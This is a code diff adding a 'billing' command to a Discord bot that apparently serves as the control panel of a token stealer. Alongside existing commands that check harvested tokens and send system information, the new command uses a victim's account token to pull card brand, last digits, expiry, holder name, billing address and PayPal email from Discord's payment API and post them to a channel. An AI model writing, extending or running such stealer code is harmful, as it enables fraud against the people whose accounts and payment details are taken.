@@ -109,7 +109,74 @@ async def checked_tokens(ctx):
     await ctx.followup.send("Checking all tokens...")
     for tk, em, ph, un, ni, bi, av, idqa in zip(valid, email, phone, uname, nitro, bill, avatar, idq): 
         await ctx.channel.send(embed=checked_embeds(tk, em, ph, un, ni, bi, av, idqa))    
+   
+@client.slash_command(description="Find billing info", guild_ids=server_ids)  
+async def billing(ctx, token):
+    await ctx.response.defer()
+    billing_info = []
+    headers = {
+        'Authorization': token,
+        'Content-Type': 'application/json'
+    }
+    cc_digits = {
+        'american express': '3',
+        'visa': '4',
+        'mastercard': '5'
+    }
+    for x in get('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers=headers).json():
+        y = x['billing_address']
+        name = y['name']
+        address_1 = y['line_1']
+        address_2 = y['line_2']
+        city = y['city']
+        postal_code = y['postal_code']
+        state = y['state']
+        country = y['country']
+
+        if x['type'] == 1:
+            cc_brand = x['brand']
+            cc_first = cc_digits.get(cc_brand)
+            cc_last = x['last_4']
+            cc_month = str(x['expires_month'])
+            cc_year = str(x['expires_year'])
+                            
+            data = {
+                'Payment Type': 'Credit Card',
+                'Valid': not x['invalid'],
+                'CC Holder Name': name,
+                'CC Brand': cc_brand.title(),
+                'CC Number': ''.join(z if (i + 1) % 2 else z + ' ' for i, z in enumerate((cc_first if cc_first else '*') + ('*' * 11) + cc_last)),
+                'CC Exp. Date': ('0' + cc_month if len(cc_month) < 2 else cc_month) + '/' + cc_year[2:4],
+                'Address 1': address_1,
+                'Address 2': address_2 if address_2 else '',
+                'City': city,
+                'Postal Code': postal_code,
+                'State': state if state else '',
+                'Country': country,
+                'Default Payment Method': x['default']
+            }
+
+        elif x['type'] == 2:
+            data = {
+                'Payment Type': 'PayPal',
+                'Valid': not x['invalid'],
+                'PayPal Name': name,
+                'PayPal Email': x['email'],
+                'Address 1': address_1,
+                'Address 2': address_2 if address_2 else '',
+                'City': city,
+                'Postal Code': postal_code,
+                'State': state if state else '',
+                'Country': country,
+                'Default Payment Method': x['default']
+            }
+
+        billing_info.append(data)
         
+    await ctx.followup.send("```" + str(billing_info[0]) + "```")
+    for a in billing_info[1:]:
+        await ctx.channel.send("```" + str(a) + "```")
+            
 @client.slash_command(description="Sends General System Information", guild_ids=server_ids)
 async def gsl(ctx):
     await ctx.response.defer()
